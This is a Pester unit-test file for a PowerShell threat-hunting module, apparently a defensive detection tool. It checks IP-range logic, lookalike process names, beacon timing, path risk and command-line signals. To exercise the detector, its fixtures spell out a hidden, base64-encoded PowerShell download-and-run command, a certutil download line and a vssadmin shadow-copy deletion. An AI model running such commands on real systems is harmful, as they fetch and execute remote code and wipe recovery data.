# Unit tests for the pure logic (no machine state needed). Written for the Pester 3.4 that ships
# with Windows (also runs on Pester 4). Run from the repo root:  Invoke-Pester .\tests

$root = Split-Path -Parent (Split-Path -Parent $MyInvocation.MyCommand.Path)
Import-Module (Join-Path $root 'SusHunt.psm1') -Force

InModuleScope SusHunt {
    Describe 'Test-IpInCidr' {
        It 'matches the last address inside an IPv4 /12' { Test-IpInCidr '172.31.255.254' '172.16.0.0/12' | Should Be $true }
        It 'rejects the first address after it' { Test-IpInCidr '172.32.0.1' '172.16.0.0/12' | Should Be $false }
        It 'handles a prefix that splits a byte (/10)' { Test-IpInCidr '100.127.0.1' '100.64.0.0/10' | Should Be $true }
        It 'handles IPv6' { Test-IpInCidr 'fe80::1234' 'fe80::/10' | Should Be $true }
        It 'never matches across address families' { Test-IpInCidr '10.0.0.1' '::/0' | Should Be $false }
    }

    Describe 'Get-IpScope' {
        It 'knows RFC 1918' { Get-IpScope '192.168.1.10' | Should Be 'Private' }
        It 'knows CGNAT (Tailscale range)' { Get-IpScope '100.101.102.103' | Should Be 'CGNAT' }
        It 'unwraps IPv4-mapped IPv6' { Get-IpScope '::ffff:10.1.2.3' | Should Be 'Private' }
        It 'calls the any-address Unspecified' { Get-IpScope '0.0.0.0' | Should Be 'Unspecified' }
        It 'defaults to Public' { Get-IpScope '1.1.1.1' | Should Be 'Public' }
        It 'rejects junk' { Get-IpScope 'not-an-ip' | Should Be 'Invalid' }
    }

    Describe 'network byte order' {
        It 'swaps the two port bytes (443 = 0x01BB -> 0xBB01)' { ConvertTo-NetworkOrderPort 443 | Should Be 0xBB01 }
        It 'lays out 127.0.0.1 as 7F 00 00 01 in memory' { ConvertTo-NetworkOrderAddress '127.0.0.1' | Should Be 0x0100007F }
    }

    Describe 'Get-EditDistance' {
        It 'counts a classic example' { Get-EditDistance 'kitten' 'sitting' | Should Be 3 }
        It 'treats a swap of neighbours as one edit' { Get-EditDistance 'scvhost' 'svchost' | Should Be 1 }
        It 'is zero for equal strings, ignoring case' { Get-EditDistance 'LSASS' 'lsass' | Should Be 0 }
    }

    Describe 'Get-LookalikeName' {
        It 'catches a digit swap' { Get-LookalikeName 'svch0st.exe' | Should Be 'svchost.exe' }
        It 'catches a letter swap' { Get-LookalikeName 'lsasss.exe' | Should Be 'lsass.exe' }
        It 'leaves the real name alone' { Get-LookalikeName 'svchost.exe' | Should BeNullOrEmpty }
        It 'leaves known real near-misses alone' { Get-LookalikeName 'taskhost.exe' | Should BeNullOrEmpty }
        It 'leaves unrelated names alone' { Get-LookalikeName 'notepad.exe' | Should BeNullOrEmpty }
    }

    Describe 'Get-CommandLineSignals' {
        $payload = 'IEX (New-Object Net.WebClient).DownloadString("http://example.invalid/a")'
        $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))

        It 'flags an encoded command and looks inside it' {
            $rules = @(Get-CommandLineSignals "powershell.exe -nop -w hidden -enc $enc" | ForEach-Object { $_.Rule })
            $rules -contains 'EncodedPowerShell' | Should Be $true
            $rules -contains 'DownloadAndRun(decoded)' | Should Be $true
            $rules -contains 'HiddenWindow' | Should Be $true
        }
        It 'shows the decoded text as evidence' {
            $s = Get-CommandLineSignals "powershell -e $enc" | Where-Object { $_.Rule -eq 'EncodedPowerShell' }
            $s.Evidence | Should Match 'DownloadString'
        }
        It 'does not mistake -ExecutionPolicy for -EncodedCommand' {
            $rules = @(Get-CommandLineSignals 'powershell.exe -ExecutionPolicy Bypass -File C:\x.ps1' | ForEach-Object { $_.Rule })
            $rules -contains 'EncodedPowerShell' | Should Be $false
            $rules -contains 'PolicyBypass' | Should Be $true
        }
        It 'flags certutil used as a downloader' {
            (Get-CommandLineSignals 'certutil.exe -urlcache -split -f http://example.invalid/a.exe a.exe').Rule | Should Be 'CertutilDownload'
        }
        It 'flags shadow copy deletion' {
            (Get-CommandLineSignals 'vssadmin.exe delete shadows /all /quiet').Rule | Should Be 'InhibitRecovery'
        }
        It 'stays quiet on an ordinary command' {
            Get-CommandLineSignals '"C:\Windows\System32\notepad.exe" C:\notes.txt' | Should BeNullOrEmpty
        }
    }

    Describe 'Get-ExecutableFromCommand' {
        $cmdExe = Join-Path $env:windir 'System32\cmd.exe'
        It 'takes a quoted path as-is' { Get-ExecutableFromCommand "`"$cmdExe`" /c echo hi" | Should Be $cmdExe }
        It 'walks an unquoted path the way CreateProcess does' { Get-ExecutableFromCommand "$cmdExe /c echo hi" | Should Be $cmdExe }
        It 'expands environment variables' { Get-ExecutableFromCommand '%windir%\System32\cmd.exe /c' | Should Be $cmdExe }
        It 'resolves a bare name through PATH' { Get-ExecutableFromCommand 'cmd.exe /c echo hi' | Should Be $cmdExe }
        It 'resolves a quoted bare name through PATH' { Get-ExecutableFromCommand '"cmd.exe" /c echo hi' | Should Be $cmdExe }
    }

    Describe 'Test-UnquotedServicePath' {
        It 'flags spaces without quotes' { Test-UnquotedServicePath 'C:\Program Files\Vendor App\svc.exe -k' | Should Be $true }
        It 'accepts a quoted path' { Test-UnquotedServicePath '"C:\Program Files\Vendor App\svc.exe" -k' | Should Be $false }
        It 'ignores a path without spaces' { Test-UnquotedServicePath 'C:\Tools\svc.exe' | Should Be $false }
    }

    Describe 'Get-PathRisk' {
        It 'rates Temp as high risk' { Get-PathRisk 'C:\Users\someone\AppData\Local\Temp\x.exe' | Should Be 'HighRisk' }
        It 'rates Downloads as high risk' { Get-PathRisk 'C:\Users\someone\Downloads\setup.exe' | Should Be 'HighRisk' }
        It 'rates Roaming as user-writable' { Get-PathRisk 'C:\Users\someone\AppData\Roaming\App\app.exe' | Should Be 'UserWritable' }
        It 'knows Program Files' { Get-PathRisk 'C:\Program Files (x86)\App\app.exe' | Should Be 'ProgramFiles' }
        It 'knows the Windows folder' { Get-PathRisk (Join-Path $env:windir 'System32\svchost.exe') | Should Be 'Windows' }
        It 'normalizes \??\ prefixes' { Get-PathRisk ('\??\' + (Join-Path $env:windir 'System32\conhost.exe')) | Should Be 'Windows' }
    }

    Describe 'Test-Beacon' {
        It 'spots a 30 s timer with jitter' {
            $b = Test-Beacon @(0, 30, 61, 90, 121, 150, 180)
            $b | Should Not BeNullOrEmpty
            $b.MeanSeconds | Should Be 30
        }
        It 'ignores bursty traffic' { Test-Beacon @(0, 2, 5, 60, 61, 200, 204) | Should BeNullOrEmpty }
        It 'needs enough samples' { Test-Beacon @(0, 30, 60) | Should BeNullOrEmpty }
    }

    Describe 'New-Finding' {
        It 'sums and caps the score at 100' {
            $f = New-Finding -Category 'Test' -Name 'x' -Signals @((New-Signal 'A' 70 '' '' ''), (New-Signal 'B' 60 '' '' ''))
            $f.Score | Should Be 100
            $f.Severity | Should Be 'High'
            $f.Summary | Should Be 'A, B'
        }
        It 'scores zero with no signals' { (New-Finding -Category 'Test' -Name 'x' -Signals @()).Score | Should Be 0 }
    }
}
